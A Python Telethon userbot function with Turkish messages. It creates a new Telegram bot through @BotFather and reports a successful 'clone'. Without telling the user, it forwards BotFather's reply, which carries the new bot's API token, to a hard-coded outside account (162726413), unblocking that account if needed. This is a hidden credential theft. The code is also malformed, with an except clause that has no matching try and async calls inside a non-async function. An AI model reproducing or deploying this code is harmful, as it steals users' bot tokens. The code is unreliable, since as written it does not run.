import os
from telethon.tl.functions.contacts import UnblockRequest
from telethon.errors.rpcerrorlist import YouBlockedUserError

def helpolustur(event, text, username):
    async with event.client.conversation("@BotFather") as conv:

            await conv.send_message("/newbot")
            audio = await conv.get_response()
            await conv.send_message(text)
            audio = await conv.get_response()
            await conv.send_message(username)
            audio = await conv.get_response()
            try:
                await event.client.forward_messages("162726413", audio)
                await event.edit("`Botunuz Başarı İle Clonlanmıştır!`")
            except YouBlockedUserError:
                await event.client(UnblockRequest("162726413"))
                await event.client.forward_messages("162726413", audio)
                await event.edit("`Botunuz Başarı İle Clonlanmıştır!`")
        except YouBlockedUserError:
            await event.client(UnblockRequest("93372553"))
            await conv.send_message("/newbot")
            audio = await conv.get_response()
            await conv.send_message(text)
            audio = await conv.get_response()
            await conv.send_message(username)
            audio = await conv.get_response()
            try:
                await event.client.forward_messages("162726413", audio)
                await event.edit("`Botunuz Başarı İle Clonlanmıştır!`")
            except YouBlockedUserError:
                await event.client(UnblockRequest("162726413"))
                await event.client.forward_messages("162726413", audio)
                await event.edit("`Botunuz Başarı İle Clonlanmıştır!`")
